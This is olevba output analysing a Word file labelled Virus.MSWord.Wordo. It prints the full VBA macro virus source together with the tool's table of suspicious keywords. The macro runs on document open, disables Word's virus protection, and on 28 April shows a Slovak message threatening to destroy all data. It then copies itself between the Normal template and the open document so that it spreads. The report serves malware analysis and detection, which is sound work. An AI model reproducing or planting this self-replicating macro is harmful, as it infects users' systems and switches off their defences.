olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wordo-dbbdeb12b4b42e92029aea24e66d889e801081eb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wordo-dbbdeb12b4b42e92029aea24e66d889e801081eb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
Options.VirusProtection = False
If InStr(Date, "28.4.") <> 0 Then
MsgBox "Nazdar!" + Chr(10) + Chr(13) + _
"Ja som virus WORDO a ked sa mi bude chciet" _
+ ", tak znicim vsetky data v tomto " _
+ "pocitaci.", vbOKOnly + vbExclamation, _
"VIRUS"
End If
If NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines = 0 Then GoTo 1
If ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines <> 0 Then Exit Sub
pr = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines - 1
z = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, pr)
ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromString (z)
ActiveDocument.Save
Exit Sub
1
pr = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines - 1
z = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, pr)
NormalTemplate.VBProject.VBComponents(1).CodeModule.AddFromString (z)
NormalTemplate.Save
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

